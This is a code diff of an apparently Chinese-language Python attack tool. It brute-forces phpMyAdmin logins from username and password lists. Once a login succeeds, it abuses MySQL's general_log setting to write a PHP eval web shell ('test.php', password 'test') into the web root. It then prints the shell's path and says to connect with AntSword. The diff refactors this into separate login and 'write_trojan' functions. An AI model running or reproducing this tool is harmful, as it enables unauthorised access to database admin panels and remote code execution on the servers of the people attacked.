@@ -10,6 +10,8 @@ from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COM
 # 用户名密码队列
 username_list = []
 password_list = []
+# session
+session = requests.session()
 
 
 async def read_file(filename, queue):
@@ -35,36 +37,35 @@ def handle_request(session, url, method, data=None, **kwargs):
     #     )
     if method == "GET":
         try:
-            response = session.get(url=url, headers=header, timeout=(10, 10))
+            response = session.get(url=url, headers=header, timeout=(20, 20))
         except Exception as e:
+            print(str(e))
             return None
         else:
             return response
     elif method == "POST":
         try:
-            response = session.post(url=url, headers=header, data=data, allow_redirects=False, timeout=(10, 10))
+            response = session.post(url=url, headers=header, data=data, allow_redirects=False, timeout=(20, 20))
             return response
         except Exception as e:
+            print(str(e))
             return None
 
 
 def phpmyadmin_crack(host, username, password):
     """phpmyadmin密码爆破"""
-    session = requests.session()
     url = host + "/phpmyadmin/index.php"
     # 第一次请求获取token
     first_response = handle_request(session=session, url=url, method="GET")
     if not first_response:
-        print("获取token失败")
-        return
+        return False, False
     if first_response.status_code == 200 and first_response:
         # 获取token
         token_search = re.compile(r'token=(.*?)"\s?target')
         token = token_search.search(first_response.text)
 
         if not token:
-            print("获取token失败")
-            return
+            return False, False
         else:
             token_value = token.group(1)
             login_url = host + "/phpmyadmin/index.php"
@@ -79,85 +80,92 @@ def phpmyadmin_crack(host, username, password):
             }
             second_response = handle_request(session=session, url=login_url, method="POST", data=login_data)
             if not second_response:
-                print("登录失败")
-                return
+                return False, False
             if second_response.status_code != 302:
-                return
+                return False, False
             else:
                 # 首页
                 index_url = host + "/phpmyadmin/main.php?token={}".format(token_value)
                 index_response = handle_request(session=session, url=index_url, method="GET")
                 if not index_response:
-                    return
+                    return False, False
                 if index_response.status_code == 200 and index_response:
                     if "常规设置" in index_response.text:
                         print("登录成功:用户名为{u},密码为{p}".format(u=username, p=password))
-                        sql_data = {
-                            "is_js_confirmed": 0,
-                            "token": token_value,
-                            "pos": 0,
-                            "goto": "server_sql.php",
-                            "message_to_show": "您的 SQL 语句已成功运行",
-                            "prev_sql_query": "",
-                            "sql_query": "",
-                            "sql_delimiter": ";",
-                            "show_query": 1,
-                            "ajax_request": "true"
-
-                        }
-                        # 设置日志开启
-                        sql_data.update(
-                            {
-                                "sql_query": "set global general_log='on';"
-                            }
-                        )
-                        sql_url = host + "/phpmyadmin/import.php"
-                        sql_log_on_response = handle_request(session=session, url=sql_url, method="POST", data=sql_data)
-                        sql_log_on = sql_log_on_response.json()
-                        if sql_log_on.get("success"):
-                            print("日志开关已打开")
-                        else:
-                            print("日志开关打开失败")
-                            return
-                        # 设置日志路径
-                        trojan_file = "test.php"
-                        path = "C:/phpStudy/WWW/{}".format(trojan_file)
-                        sql_data.update(
-                            {
-                                "sql_query": "set global general_log_file = '{}';".format(path)
-                            }
-                        )
-                        sql_log_path_response = handle_request(session=session, url=sql_url, method="POST",
-                                                               data=sql_data)
-                        sql_log_path = sql_log_path_response.json()
-                        if sql_log_path.get("success"):
-                            print("日志路径设置成功")
-                        else:
-                            print("日志路径设置失败")
-                            return
-                        # 写入一句话木马
-                        sql_data.update(
-                            {
-                                "sql_query": """select '<?php eval($_POST["test"]);?>'"""
-                            }
-                        )
-                        print("开始写入一句话木马")
-                        # header = {
-                        #     "referer": host + "/phpmyadmin/server_sql.php?token={}".format(token_value)
-                        # }
-                        trojan_response = handle_request(session=session, url=sql_url, method="POST", data=sql_data)
-                        if trojan_response:
-                            if trojan_response.status_code == 200:
-                                print("一句话木马路径: {},密码test,请使用蚁剑连接".format(host + "/" + trojan_file))
-                                return True
-                        # # 查询sql日志状态
-                        #     "sql_query": "show global variables like '%genera%';",
-                        # sql_state_response = handle_request(session=session, url=sql_state_url, method="POST", data=sql_state_data)
-                        # print(sql_state_response.text)
+                        return True, token_value
                     else:
-                        return False
+                        return False, False
                 else:
-                    return False
+                    return False, False
+
+
+def write_trojan(token_value, host):
+    """写入木马"""
+    sql_data = {
+        "is_js_confirmed": 0,
+        "token": token_value,
+        "pos": 0,
+        "goto": "server_sql.php",
+        "message_to_show": "您的 SQL 语句已成功运行",
+        "prev_sql_query": "",
+        "sql_query": "",
+        "sql_delimiter": ";",
+        "show_query": 1,
+        "ajax_request": "true"
+
+    }
+    # 设置日志开启
+    sql_data.update(
+        {
+            "sql_query": "set global general_log='on';"
+        }
+    )
+    sql_url = host + "/phpmyadmin/import.php"
+    sql_log_on_response = handle_request(session=session, url=sql_url, method="POST", data=sql_data)
+    sql_log_on = sql_log_on_response.json()
+    if sql_log_on.get("success"):
+        print("日志开关已打开")
+    else:
+        print("日志开关打开失败")
+        return
+    # 设置日志路径
+    trojan_file = "test.php"
+    path = "C:/phpStudy/WWW/{}".format(trojan_file)
+    sql_data.update(
+        {
+            "sql_query": "set global general_log_file = '{}';".format(path)
+        }
+    )
+    sql_log_path_response = handle_request(session=session, url=sql_url, method="POST",
+                                           data=sql_data)
+    sql_log_path = sql_log_path_response.json()
+    if sql_log_path.get("success"):
+        print("日志路径设置成功")
+    else:
+        print("日志路径设置失败")
+        return
+    # 写入一句话木马
+    sql_data.update(
+        {
+            "sql_query": """select '<?php eval($_POST["test"]);?>'"""
+        }
+    )
+    print("开始写入一句话木马")
+    # header = {
+    #     "referer": host + "/phpmyadmin/server_sql.php?token={}".format(token_value)
+    # }
+    trojan_response = handle_request(session=session, url=sql_url, method="POST", data=sql_data)
+    if trojan_response:
+        if trojan_response.status_code == 200:
+            print("一句话木马路径: {},密码test,请使用蚁剑连接".format(host + "/" + trojan_file))
+            return True
+    else:
+        print("写入一句话木马失败")
+        return
+    # # 查询sql日志状态
+    #     "sql_query": "show global variables like '%genera%';",
+    # sql_state_response = handle_request(session=session, url=sql_state_url, method="POST", data=sql_state_data)
+    # print(sql_state_response.text)
 
 
 async def handle_user_pass():
@@ -169,7 +177,7 @@ async def handle_user_pass():
     await asyncio.wait(user_pass_tasks)
 
 
-def main(host, max_workers):
+def handle_login(host, max_workers):
     loop = asyncio.get_event_loop()
     loop.run_until_complete(handle_user_pass())
     for username in username_list:
@@ -178,10 +186,19 @@ def main(host, max_workers):
                                  password in password_list]
             wait(handle_phpmyadmin, return_when=FIRST_COMPLETED)
             for data in as_completed(handle_phpmyadmin):
-                if data.result():
-                    return
+                login_result = data.result()
+                if login_result[0]:
+                    return login_result[1]
     # 测试
-    # phpmyadmin_crack(host=host, username="root", password="root")
+    # login_result = phpmyadmin_crack(host=host, username="root", password="root")
+    # if login_result[0]:
+    #     return login_result[1]
+
+
+def main(host, max_workers):
+    login_result = handle_login(host, max_workers)
+    if login_result:
+        write_trojan(token_value=login_result, host=host)
 
 
 if __name__ == '__main__':
